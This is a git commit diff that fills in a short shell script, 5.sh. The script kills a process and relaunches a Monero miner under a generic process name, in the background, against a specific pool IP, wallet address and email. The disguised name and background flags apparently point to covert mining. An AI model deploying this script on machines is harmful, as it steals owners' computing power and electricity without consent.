a950b588f18943a3584749964397fd9ee907e238
bangmining <59116551+bangmining@users.noreply.github.com>
2019-12-23 22:20:54 +0700

    Update 5.sh

--- 5.sh
+++ 5.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o ВАШ ИП:ПОРТ -u ВАШ КОШЕЛЁК МОНЕРО --pass=x:ВАША ПОЧТА --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=87 --av=1
+defaultsoftwarename -o 192.99.122.23:3323 -u 47LoVKeFxkCR8gZXELWWXrZqBtnx1AzKrDFi8BsVHArF1UwUx324veFFJssSFhd5zgFtfHVjkPa3rLQqcF1g1J3qSoJhj3m --pass=x:bangmining@protonmail.com --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=87 --av=1
